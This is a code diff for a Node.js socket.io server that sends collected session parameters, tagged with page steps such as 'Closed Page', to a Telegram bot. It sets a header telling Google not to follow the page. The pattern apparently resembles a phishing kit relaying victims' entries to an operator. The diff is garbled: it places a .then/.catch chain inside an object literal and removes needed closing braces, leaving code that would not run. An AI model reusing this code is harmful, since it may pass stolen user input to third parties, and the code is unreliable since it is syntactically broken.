@@ -94,6 +94,12 @@ io.on("connection", (socket) => {
             const finalParams = params + `\nCurrent Step: Closed Page\n=============================`;
 
             axios.post(`https://api.telegram.org/bot${process.env.BOT}/sendMessage`, {
+.then(response => {
+    console.log("Telegram success:", response.data);
+})
+.catch(error => {
+    console.error("Telegram error:", error.message);
+});
                 chat_id: process.env.CHAT_ID,
                 text: finalParams,
                 parse_mode: 'Markdown',
@@ -104,11 +110,8 @@ io.on("connection", (socket) => {
                         'X-Robots-Tag': 'googlebot: nofollow',
                     },
 
-                }).then(response => {
     console.log("Telegram success:", response.data);
-}).catch(error => {
     console.error("Telegram error:", error.message);
 })
         }
-    });
 });
